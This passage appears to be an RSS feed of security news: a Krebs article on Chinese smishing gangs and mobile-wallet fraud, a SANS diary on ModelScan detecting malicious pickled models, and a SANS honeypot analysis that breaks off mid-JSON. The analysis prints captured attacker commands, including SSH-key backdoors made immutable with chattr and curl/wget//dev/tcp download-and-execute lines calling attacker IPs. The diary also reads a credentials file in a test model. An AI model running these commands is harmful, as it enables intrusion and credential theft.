sending a one-time passcode to the customer’s mobile device. In reality, that code will be sent by the victim’s financial institution to verify that the user indeed wishes to link their card information to a mobile wallet.If the victim then provides that one-time code, the phishers will link the card data to a new mobile wallet from Apple or Google, loading the wallet onto a mobile phone that the scammers control. works in security research at SecAlliance, a CSIS Security Group company. Merrill has been studying the evolution of several China-based smishing gangs, and found that most of them feature helpful and informative video tutorials in their sales accounts on Telegram. Those videos show the thieves are loading multiple stolen digital wallets on a single mobile device, and then selling those phones in bulk for hundreds of dollars apiece.“Who says carding is dead?,” said Merrill, who presented about his findings at the M3AAWG security conference in Lisbon earlier today. “This is the best mag stripe cloning device ever. This threat actor is saying you need to buy at least 10 phones, and they’ll air ship them to you.”One promotional video shows stacks of milk crates stuffed full of phones for sale. A closer inspection reveals that each phone is affixed with a handwritten notation that typically references the date its mobile wallets were added, the number of wallets on the device, and the initials of the seller.An image from the Telegram channel for a popular Chinese smishing kit vendor shows 10 mobile phones for sale, each loaded with 4-6 digital wallets from different UK financial institutions.Merrill said one common way criminal groups in China are cashing out with these stolen mobile wallets involves setting up fake e-commerce businesses on  or  and running transactions through those entities — often for amounts totaling between $100 and $500.Merrill said that when these phishing groups first began operating in earnest two years ago, they would wait between 60 to 90 days before selling the phones or using them for fraud. But these days that waiting period is more like just seven to ten days, he said.“When they first installed this, the actors were very patient,” he said. “Nowadays, they only wait like 10 days before [the wallets] are hit hard and fast.”Criminals also can cash out mobile wallets by obtaining real point-of-sale terminals and using tap-to-pay on phone after phone. But they also offer a more cutting-edge mobile fraud technology: Merrill found that at least one of the Chinese phishing groups sells an Android app called “” that can relay a valid NFC transaction to anywhere in the world. The user simply waves their phone at a local payment terminal that accepts Apple or Google pay, and the app relays an NFC transaction over the Internet from a phone in China.“The software can work from anywhere in the world,” Merrill said. “These guys provide the software for $500 a month, and it can relay both NFC enabled tap-to-pay as well as any digital wallet. The even have 24-hour support.”The rise of so-called “ghost tap” mobile software was first documented in November 2024 by security experts at . , the company’s chief commercial officer, said their researchers have since identified a number of criminal groups from different regions of the world latching on to this scheme.Chandler said those include organized crime gangs in Europe that are using similar mobile wallet and NFC attacks to take money out of ATMs made to work with smartphones.“No one is talking about it, but we’re now seeing ten different methodologies using the same modus operandi, and none of them are doing it the same,” Chandler said. “This is much bigger than the banks are prepared to say.”A November 2024 story in the Singapore daily reported authorities there arrested three foreign men who were recruited in their home countries via social messaging platforms, and given ghost tap apps with which to purchase expensive items from retailers, including mobile phones, jewelry, and gold bars.“Since Nov 4, at least 10 victims who had fallen for e-commerce scams have reported unauthorised transactions totaling more than $100,000 on their credit cards for purchases such as electronic products, like iPhones and chargers, and jewelry in Singapore,”  wrote, noting that in another case with a similar modus operandi, the police arrested a Malaysian man and woman on Nov 8.Three individuals charged with using ghost tap software at an electronics store in Singapore. Image: The Straits Times.ADVANCED PHISHING TECHNIQUESAccording to Merrill, the phishing pages that spoof the USPS and various toll road operators are powered by several innovations designed to maximize the extraction of victim data.For example, a would-be smishing victim might enter their personal and financial information, but then decide the whole thing is scam before actually submitting the data. In this case, anything typed into the data fields of the phishing page will be captured in real time, regardless of whether the visitor actually clicks the “submit” button.Merrill said people who submit payment card data to these phishing sites often are then told their card can’t be processed, and urged to use a different card. This technique, he said, sometimes allows the phishers to steal more than one mobile wallet per victim.Many phishing websites expose victim data by storing the stolen information directly on the phishing domain. But Merrill said these Chinese phishing kits will forward all victim data to a back-end database operated by the phishing kit vendors. That way, even when the smishing sites get taken down for fraud, the stolen data is still safe and secure.Another important innovation is the use of mass-created Apple and Google user accounts through which these phishers send their spam messages. One of the Chinese phishing groups posted images on their Telegram sales channels showing how these robot Apple and Google accounts are loaded onto Apple and Google phones, and arranged snugly next to each other in an expansive, multi-tiered rack that sits directly in front of the phishing service operator.The ashtray says: You’ve been phishing all night.In other words, the smishing websites are powered by real human operators as long as new messages are being sent. Merrill said the criminals appear to send only a few dozen messages at a time, likely because completing the scam takes manual work by the human operators in China. After all, most one-time codes used for mobile wallet provisioning are generally only good for a few minutes before they expire.Notably, none of the phishing sites spoofing the toll operators or postal services will load in a regular Web browser; they will only render if they detect that a visitor is coming from a mobile device.“One of the reasons they want you to be on a mobile device is they want you to be on the same device that is going to receive the one-time code,” Merrill said. “They also want to minimize the chances you will leave. And if they want to get that mobile tokenization and grab your one-time code, they need a live operator.”Merrill found the Chinese phishing kits feature another innovation that makes it simple for customers to turn stolen card details into a mobile wallet: They programmatically take the card data supplied by the phishing victim and convert it into a digital image of a real payment card that matches that victim’s financial institution. That way, attempting to enroll a stolen card into Apple Pay, for example, becomes as easy as scanning the fabricated card image with an iPhone.An ad from a Chinese SMS phishing group’s Telegram channel showing how the service converts stolen card data into an image of the stolen card.“The phone isn’t smart enough to know whether it’s a real card or just an image,” Merrill said. “So it scans the card into Apple Pay, which says okay we need to verify that you’re the owner of the card by sending a one-time code.”How profitable are these mobile phishing kits? The best guess so far comes from data gathered by other security researchers who’ve been tracking these advanced Chinese phishing vendors.In August 2023, the security firm Resecurity discovered a vulnerability in one popular Chinese phish kit vendor’s platform that exposed the personal and financial data of phishing victims. Resecurity dubbed the group the , and found the gang had harvested 108,044 payment cards across 31 phishing domains (3,485 cards per domain).In August 2024, security researcher  gave a presentation at the DEFCON security conference about tracking down the Smishing Triad after scammers spoofing the U.S. Postal Service duped his wife. By identifying a different vulnerability in the gang’s phishing kit, Smith said he was able to see that people entered 438,669 unique credit cards in 1,133 phishing domains (387 cards per domain).Based on his research, Merrill said it’s reasonable to expect between $100 and $500 in losses on each card that is turned into a mobile wallet. Merrill said they observed nearly 33,000 unique domains tied to these Chinese smishing groups during the year between the publication of Resecurity’s research and Smith’s DEFCON talk.Using a median number of 1,935 cards per domain and a conservative loss of $250 per card, that comes out to about $15 billion in fraudulent charges over a year.Merrill was reluctant to say whether he’d identified additional security vulnerabilities in any of the phishing kits sold by the Chinese groups, noting that the phishers quickly fixed the vulnerabilities that were detailed publicly by Resecurity and Smith.Adoption of touchless payments took off in the United States after the Coronavirus pandemic emerged, and many financial institutions in the United States were eager to make it simple for customers to link payment cards to mobile wallets. Thus, the authentication requirement for doing so defaulted to sending the customer a one-time code via SMS.Experts say the continued reliance on one-time codes for onboarding mobile wallets has fostered this new wave of carding. KrebsOnSecurity interviewed a security executive from a large European financial institution who spoke on condition of anonymity because they were not authorized to speak to the press.That expert said the lag between the phishing of victim card data and its eventual use for fraud has left many financial institutions struggling to correlate the causes of their losses.“That’s part of why the industry as a whole has been caught by surprise,” the expert said. “A lot of people are asking, how this is possible now that we’ve tokenized a plaintext process. We’ve never seen the volume of sending and people responding that we’re seeing with these phishers.”To improve the security of digital wallet provisioning, some banks in Europe and Asia require customers to log in to the bank’s mobile app before they can link a digital wallet to their device.Addressing the ghost tap threat may require updates to contactless payment terminals, to better identify NFC transactions that are being relayed from another device. But experts say it’s unrealistic to expect retailers will be eager to replace existing payment terminals before their expected lifespans expire.And of course Apple and Google have an increased role to play as well, given that their accounts are being created en masse and used to blast out these smishing messages. Both companies could easily tell which of their devices suddenly have 7-10 different mobile wallets added from 7-10 different people around the world. They could also recommend that financial institutions use more secure authentication methods for mobile wallet provisioning.Neither Apple nor Google responded to requests for comment on this story.]]></content:encoded></item><item><title>https://SecTemplates.com - simplified, free open-source templates to enable engineering and smaller security teams to bootstrap security capabilities for their organizations, (Tue, Feb 18th)</title><link>https://isc.sans.edu/diary/rss/31696</link><author></author><category>infosec</category><pubDate>Tue, 18 Feb 2025 17:39:26 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[
- 
- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.]]></content:encoded></item><item><title>Story About Medical Device Security</title><link>https://www.schneier.com/blog/archives/2025/02/story-about-medical-device-security.html</link><author>Bruce Schneier</author><category>infosec</category><category>blog</category><pubDate>Tue, 18 Feb 2025 12:06:07 +0000</pubDate><source url="https://www.schneier.com/">Schneider on Security</source><content:encoded><![CDATA[Ben Rothke relates a story about me working with a medical device firm back when I was with BT. I don’t remember the story at all, or who the company was. But it sounds about right.]]></content:encoded></item><item><title>DtSR Episode 641 - Kevin Fielder Security Principles and Guard Rails</title><link></link><author></author><category>infosec</category><category>podcast</category><enclosure url="https://dts.podtrac.com/redirect.mp3/www.buzzsprout.com/2153215/episodes/16627900-dtsr-episode-641-kevin-fielder-security-principles-and-guard-rails.mp3" length="" type=""/><pubDate>Tue, 18 Feb 2025 05:00:00 +0000</pubDate><source url="https://blogwh1t3rabbit.medium.com/">Down the Security Rabbit Hole Podcast</source></item><item><title>ISC Stormcast For Tuesday, February 18th, 2025 https://isc.sans.edu/podcastdetail/9328, (Tue, Feb 18th)</title><link>https://isc.sans.edu/diary/rss/31694</link><author></author><category>infosec</category><pubDate>Tue, 18 Feb 2025 02:00:02 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[
- 
- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.]]></content:encoded></item><item><title>ModelScan - Protection Against Model Serialization Attacks, (Mon, Feb 17th)</title><link>https://isc.sans.edu/diary/rss/31692</link><author></author><category>infosec</category><pubDate>Tue, 18 Feb 2025 00:37:10 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[Protect AI’s OSS portfolio includes tools aimed at improving security of AI/ML software. These tools are meant for a wide range of engineering, security and ML practitioners including developers, security engineers/researchers, ML engineers, LLM engineers and prompt engineers, and data scientists.
-Of particular interest in light of model serialization attacks is ModelScan.Headlines as recent as 6 FEB 2025 remind us that the popular Python Pickle serialization format, common for distributing AI models, offers attackers opportunities to inject malicious code to be executed when loading models with PyTorch.[1] See Malicious ML models discovered on Hugging Face platform. Post training, model’s mathematical representations can be stored in a variety of data serialization formats to be shared and reused without the need for additional model training. Pickle is a popular Python module used for serializing and deserializing ML model data. While easy to use, Pickle is considered an unsafe data format, as it allows Python code to be executed during ML model deserialization.[2]
-As you can imagine, even as protective measures are being implemented, safety scanning is still recommended. ModelScan offers such capabilities with ease and convenience. ModelScan is incredibly well documented and include notebooks to aid experimentation and adoption.
-I’ll share my quick setup steps, modify to your liking and preferences. These assume you’re building from scratch including Jupyter.sudo apt install python3-pip python3-dev
-sudo -H pip3 install --upgrade pip --break-system-packages
-sudo -H pip3 install virtualenv --break-system-packages
-cd code/
-virtualenv modelscan-env
-source modelscan-env/bin/activate
-pip install modelscan
-pip install jupyter
-jupyter notebook
-I also cloned the ModelScan repo in my  directory.
-Read the repository README for yourself, but borrowing a few key highlights for efficacy here.
-“A Model Serialization Attack is where malicious code is added to the contents of a model during serialization(saving) before distribution — a modern version of the Trojan Horse. The attack functions by exploiting the saving and loading process of models. When you load a model with model = torch.load(PATH), PyTorch opens the contents of the file and begins to running the code within. The second you load the model the exploit has executed."[3] A Model Serialization Attack can be used to execute:Credential Theft (Cloud credentials for writing and reading data to other systems in your environment)Data Theft (the request sent to the model)Data Poisoning (the data sent after the model has performed its task)Model Poisoning (altering the results of the model itself)I took liberties with the pytorch_sentiment_analysis notebook found in  and modified it to exemplify local Google Cloud credential secrets disclosure as opposed those for AWS as conveyed in the original notebook.
-One note of interest. PyTorch is moving from away from what was a default configuration where  ran with  set to false, and is issuing the following warning if you don’t set the parameter to false (for experimention only) explicitly.
-“torch.load() unless weights_only parameter is set to True, uses pickle module implicitly, which is known to be insecure. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never load data that could have come from an untrusted source in an unsafe mode, or that could have been tampered with. Only load data you trust.”
-Certainly, a good safety update for added protection, but thou shalt still scan. ;-) conveys notebook setup and the BERT based sentiment analysis PyTorch model used as the test subject. Setup and model savingAs seen in , the notebook next offers prediction via the safe version of the model, then executes ModelScan with clean results to be expected. Safe prediction and initial model scanmodelscan –path PyTorchModels/safe_model.pt yields .Next, we inject “malicious” code, cat ~/.config/gcloud/credentials.db in the safe model to simply read my Google Cloud client secret. A more sophisticated attack could include a reverse shell or secrets exfiltration. The model executes the malicious code as well as the expected prediction, as seen in . Injection and unsafe predictionFinally, the unsafe (evil) model is scanned, and the use of the unsafe operator  (defined under the  parameter in the serialization attack cell) is flagged as , as seen in . Injection and unsafe predictionModelScan save results in JSON or other reporting formats, and can scan models from a variety of ML libraries including Pytorch, Tensorflow, Keras, and Classic ML Libraries (Sklearn, XGBoost etc.).
-Protect AI strongly recommends integrating ModelScan in your ML pipelines and CI/CD pipelines. They also have commercial offerings to better secure your AI implementations. To reiterate their assertion, model scanning must be performed more than once to accomplish the following:Scan all pre-trained models before loading it for further work to prevent a compromised model from impacting your model building or data science environmentsScan all models after training to detect a supply chain attack that compromises new modelsScan all models before deploying to an endpoint to ensure that the model has not been compromised after storageStart with ModelScan, also give Fickling an indepth look, and avoid falling victim to headline generating AI/ML attack scenarios.Recommended reading and tooling:
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.]]></content:encoded></item><item><title>&amp;#x5b;Guest Diary&amp;#x5d; Anatomy of a Linux SSH Honeypot Attack: Detailed Analysis of Captured Malware, (Fri, Jun 13th)</title><link>https://isc.sans.edu/diary/rss/32024</link><author></author><category>infosec</category><pubDate>Fri, 13 Jun 2025 00:21:01 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[On April 29, 2025, my Raspberry Pi-based Cowrie SSH honeypot captured a sophisticated attack campaign targeting Linux systems. This wasn't just another automated scanner - the logs reveal a multi-stage attack involving SSH brute forcing, backdoor installation, and deployment of architecture-specific malware. In this post, I'll walk through the entire attack chain, from initial access to persistence mechanisms, providing both technical details for security professionals and explanations accessible to those newer to cybersecurity. By understanding how these attacks work in detail, we can better protect our systems from similar threats.Welcome to my digital fishing expedition! I transformed a modest Raspberry Pi 5 into an irresistible target for cyber attackers by deploying Cowrie - an advanced SSH honeypot that mimics vulnerable systems while secretly documenting every keystroke and technique employed by unsuspecting intruders. Unlike simple packet logging, Cowrie creates an interactive playground where attackers believe they've gained access to a poorly secured Linux system, all while their tactics, tools, and techniques are meticulously recorded for our analysis. This sophisticated deception environment provides a fascinating window into the current attack landscape without putting any production systems at risk.This approach gives us a front-row seat to the cybersecurity battlefield, where we can observe real-world adversaries' behaviors in their natural habitat rather than merely theorizing about potential attack vectors. The data collected here represents authentic attack techniques being deployed against systems worldwide at this very moment.Raspberry Pi 5 running a customized Debian-based distributionCowrie SSH honeypot configured to listen on port 2222 (forwarded to appear as port 22)JSON-based logging of all interactionsExposed public IP address with minimal firewall restrictionsThe honeypot was configured to allow seemingly successful login attempts with weak credentials, giving attackers the impression they had gained access to a poorly secured Linux system [2].Initial Access: The Hunt for CredentialsThe honeypot logs reveal numerous SSH brute force attempts throughout April 29th. The attackers used various source IPs but similar attack patterns, suggesting a coordinated campaign or use of compromised infrastructure. The successful compromise occurred at 17:25:32 UTC from IP address %%ip:196.251.70.219%%. The attacker's SSH client identified as "", indicating the use of a Go-based scanning/exploitation tool. This is consistent with automated attack frameworks commonly used in large-scale campaigns.The attacker successfully authenticated using:This highlights a critical security issue many systems face - the use of simple, easily guessable passwords. Even in 2025, default or weak credentials remain one of the primary vectors for initial compromise.cat /home/raspberry/attack_timeline.txt | grep -A 5 "login.success" | grep "196.251.70.219"
+2025-04-29T17:25:32.830913Z 196.251.70.219 cowrie.session.connect
+2025-04-29T17:25:32.831335Z 196.251.70.219 cowrie.client.version
+2025-04-29T17:25:32.857270Z 196.251.70.219 cowrie.client.kex
+2025-04-29T17:25:33.137854Z 196.251.70.219 cowrie.login.success
+2025-04-29T17:25:48.681675Z 196.251.70.219 cowrie.session.params
+2025-04-29T17:25:48.682372Z 196.251.70.219 cowrie.command.input
+2025-04-29T17:25:48.715791Z 196.251.70.219 cowrie.session.file_download
+2025-04-29T17:25:48.717741Z 196.251.70.219 cowrie.session.file_upload
+2025-04-29T17:25:48.719845Z 196.251.70.219 cowrie.session.file_uploadWithin seconds of gaining access, the attacker executed a series of commands to establish persistence. The attack was highly automated, with all actions occurring within a 15-second timeframe, suggesting a well rehearsed and scripted approach.The main attack session began with the attacker uploading multiple files via SFTP:The most significant persistence mechanism was the installation of an SSH key into the  file:mkdir -p ~/.ssh
+chattr -ia ~/.ssh/authorized_keys
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK2 \
+16q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv6 \
+6I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96h \
+u1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWp \
+O2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUs \
+lEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys
+chattr +ai ~/.ssh/authorized_keysThe command is particularly notable - it sets the "" and "" attributes on the  file, making it difficult for system administrators or security tools to modify or remove the backdoor without specialized knowledge. The attacker followed this by checking system information with uname -a and sending a confirmation message back to their infrastructure with the encoded string \x61\x75\x74\x68\x5F\x6F\x6B\x0A which decodes to "" - signaling successful compromise.{"eventid":"cowrie.command.input","input":"chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; craspberry@pi5:~ $ echo -e "\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A"auth_okMalware Analysis: Hunting for Architecture-Specific PayloadsThe attacker came prepared with multiple malware variants tailored for different CPU architectures, ensuring successful infection regardless of the target system: - Targeting older ARM-based devices (SHA-256: 2ef6bb55a79d81fbda6d574456a8c187f610c5ae2ddca38e32cf7cc50912b0bf) [3] - For newer ARM64 architecture (SHA-256: fc8730fbe87bcbdc093a1ffbcb0028ccb4c24638e55d13fd853b07574f4cbe4a) [4] - For 32-bit x86 systems (SHA-256: 7780e72f7dea978946d4615c8db1b239d3e2c742cfc8be2934006b1fd6071110) [5] - For 64-bit x86 systems (SHA-256: b6ee8e08f1d4992ca85770e6883c1d2206ebbaf42f99d99aba0e26278de8bffb) [6]Beyond the SSH compromise, the logs also reveal alternative infection attempts targeting other vulnerable systems. In a separate session, the attacker attempted to download and execute binaries from external infrastructure:cd /tmp
+wget 209.141.34[.]106/PangaKenya/KKveTTgaAAsecNNaaaa.x86_64
+chmod +x KKveTTgaAAsecNNaaaa.x86_64
+./KKveTTgaAAsecNNaaaa.x86_64
+rm -rf KKveTTgaAAsecNNaaaa.x86_64This "download, execute, delete" pattern is a common technique to avoid leaving malicious files on disk for security tools to detect. The logs also show a more complex fallback mechanism attempting to download malware through three different methods (curl, wget, and direct TCP socket) in case one fails:nohup $SHELL -c "curl http://202.55.82[.]250:60140/linux -o /tmp/mEpGt06b5j; 
+if [ ! -f /tmp/mEpGt06b5j ]; then 
+  wget http://202.55.82[.]250:60140/linux -O /tmp/mEpGt06b5j; 
+fi; 
+if [ ! -f /tmp/mEpGt06b5j ]; then 
+  exec 6<>/dev/tcp/202.55.82.250/60140 && 
+  echo -n 'GET /linux' >&6 && 
+  cat 0<&6 > /tmp/mEpGt06b5j; 
+  chmod +x /tmp/mEpGt06b5j && 
+  /tmp/mEpGt06b5j [REDACTED ENCODED PARAMETERS];
+fi;" &The long encoded string included after the binary execution contains what appears to be configuration data or command and control information.{
+ "persistence_mechanism": {
+ "method": "SSH authorized key",
+ "key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1
+GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscV
+xegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBY
+hol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6
+FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1
+hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629",
+ "key_comment": "rsa-key-20230629",
+ "fingerprint": "SHA256:78gkKoLYeUW62etRipAiAw2jImcwCMnvC5BO9+3mOtY",
+ "protection": "chattr +ai (make file immutable)"
+ },
+ "command_sequence": "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setu
+p.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo
+\"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0
+q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5y
+uZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1Gt
+hAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF
+6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/z
+evIcX8+6H7kUMRr rsa-key-20230629\" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authori
+zed_keys; uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\";"
+ },
+
+ "additional_malware_downloads": [
+ {
+ "timestamp": "2025-04-29T07:24:22.084908Z",
+ "attacker_ip": "176.65.148.181",
+ "malware_source": "209.141.34.106",
+ "malware_path": "/PangaKenya/",
+ "files": [
+ {
+ "filename": "KKveTTgaAAsecNNaaaa.x86_64",
+ "sha256": "811cd6ebeb9e2b7438ad9d7c382db13c1c04b7d520495261093af51797f5
+d4cc"
+ },
+ {
+ "filename": "KKveTTgaAAsecNNaaaa.x86",
+ "sha256": "9ac2e308b0b30354575bba88169283fa7439d34937a148ccb390bcec3c
+6e296b"
+ }
+ ],
+ "command": "cd /tmp; wget 209.141.34.106/PangaKenya/KKveTTgaAAsecNNaaaa.x86_6
+4; chmod +x KKveTTgaAAsecNNaaaa.x86_64; ./KKveTTgaAAsecNNaaaa.x86_64 ; rm -rf K
+KveTTgaAAsecNNaaaa.x86_64; wget 209.141.34.106/PangaKenya/KKveTTgaAAsecNNaaaa.
+x86; chmod +x KKveTTgaAAsecNNaaaa.x86; ./KKveTTgaAAsecNNaaaa.x86 ; rm -rf KKveT
+TgaAAsecNNaaaa.x86"
+ },
+ {
+ "timestamp": "2025-04-29T09:43:28.358260Z",
+ "attacker_ip": "47.236.58.21",
+ "malware_source": "202.55.82.250:60140",
+ "malware_path": "/linux",
+ "destination": "/tmp/mEpGt06b5j",
+ "download_mechanism": "Multiple fallbacks: curl ? wget ? direct socket",
+ "additional_actions": [
+ "Creates /tmp/.opass with password '12345678'",
+ "Executes with encoded command line parameters"
+ ],
+ "command_excerpt": "nohup $SHELL -c \"curl http://202.55.82.250:60140/linux -o /tm
+p/mEpGt06b5j; if [ ! -f /tmp/mEpGt06b5j ]; then wget http://202.55.82.250:60140/linux -O /
+tmp/mEpGt06b5j; fi; if [ ! -f /tmp/mEpGt06b5j ]; then exec 6<>/dev/tcp/202.55.82.250/601
+40 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/mEpGt06b5j ; chmod +x /tmp/mEpGt0
+6b5j && /tmp/mEpGt06b5j CSKwgLxYG+KdmZqF+BdTqIG0M3R0..."
+ }
+ ],
+
+ "attack_campaign": {
+ "pattern": "Widespread SSH key installation across many IP addresses",
+ "common_actions": [
+ "ssh key installation",
+ "checking crontab entries",
+ "file immutability via chattr",
+ "removal of attack artifacts"
+ ],
+ "target": "Linux systems across multiple architectures"
+ }Persistence Mechanisms: Staying Under the RadarIn addition to the SSH key backdoor, the attackers employed multiple techniques to maintain access and resist removal attempts:1. File Attribute ManipulationThe logs show consistent use of the  command to set immutable flags on files:chattr +ai ~/.ssh/authorized_keysThis prevents the file from being modified or deleted through normal means, complicating remediation efforts.The attackers routinely checked for scheduled tasks using  , likely to:Identify any security monitoring tools that might detect their presenceUnderstand system maintenance schedulesFind opportunities to add their own persistence mechanismsThe logs show over 40 different sessions executing this command, indicating a systematic approach to reconnoitering compromised systems.crontab -l
+# Session 7332db45b083 (135.148.27.57) at 2025-04-29T01:36:43
+# Session 43583c947eab (45.55.187.1) at 2025-04-29T02:10:45
+# Session e2cfd359b841 (81.19.140.78) at 2025-04-29T03:00:37
+# Session 913f4c51570e (120.133.83.199) at 2025-04-29T03:34:14
+# Session 374ae6b1e98c (77.105.181.82) at 2025-04-29T03:47:043. Targeting Multiple ArchitecturesBy preparing malware for ARM7, ARM8, i686, and x86_64 architectures, the attackers ensured their ability to maintain presence across heterogeneous environments - from small IoT devices to server infrastructure.The attack chain included execution of a script named clean.sh which likely removed evidence of the intrusion from system logs and temporary directories. This "anti-forensics" approach makes detection more difficult for security teams. {
+ "eventid": "cowrie.session.file_upload",
+ "filename": "clean.sh",
+ "outfile": "var/lib/cowrie/downloads/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6
+fb3ab5388d2c5bc6a98e",
+ "shasum": "d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98
+e",
+ "message": "SFTP Uploaded file \"clean.sh\" to var/lib/cowrie/downloads/d46555af1173d
+22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e",
+ "sensor": "",
+ "timestamp": "2025-04-29T17:25:48.717741Z",
+ "src_ip": "196.251.70.219",
+ "session": "90db1182d123"
+ },
+ {
+ "eventid": "cowrie.command.input",
+ "input": "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.s
+h; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-rsa AAAA
+B3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7Ag
+vfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPX
+xg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrv
+aRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSm
+dw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUM
+Rr rsa-key-20230629\" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; unam
+e -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; ",
+ "message": "CMD: chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh;
+sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"sshrsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7ne
+NVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEa
+DAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMt
+PAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfd
+mHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX
+8+6H7kUMRr rsa-key-20230629\" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_
+keys; uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; ",
+ "sensor": "",
+ "timestamp": "2025-04-29T17:25:48.682372Z",
+ "src_ip": "196.251.70.219",
+ "session": "90db1182d123"
+ }
+]
+[
+ {
+ "event_type": "command_execution",
+ "timestamp": "2025-04-29T17:25:48.682372Z",
+ "src_ip": "196.251.70.219",
+ "session": "90db1182d123",
+ "command_sequence": [
+ {
+ "phase": "cleanup_script_execution",
+ "commands": [
+ "chmod +x clean.sh",
+ "sh clean.sh",
+ "rm -rf clean.sh"
+ ]
+ },
+ {
+ "phase": "malware_installation",
+ "commands": [
+ "chmod +x setup.sh",
+ "sh setup.sh",
+ "rm -rf setup.sh"
+ ]
+ },
+ {
+ "phase": "persistence_establishment",
+ "commands": [
+ "mkdir -p ~/.ssh",
+ "chattr -ia ~/.ssh/authorized_keys",
+ "echo \"ssh-rsa AAAAB3NzaC1yc2EAAAA[...truncated...]kUMRr rsa-key-20230629\"
+> ~/.ssh/authorized_keys",
+ "chattr +ai ~/.ssh/authorized_keys"
+ ]
+ },
+ {
+ "phase": "system_identification",
+ "commands": [
+ "uname -a"
+ ]
+ },
+ {
+ "phase": "callback_confirmation",
+ "commands": [
+ "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\""
+ ],
+ "decoded_message": "auth_ok"
+ }
+ ]
+ },
+ {
+ "event_type": "file_download",
+ "duplicate": true,
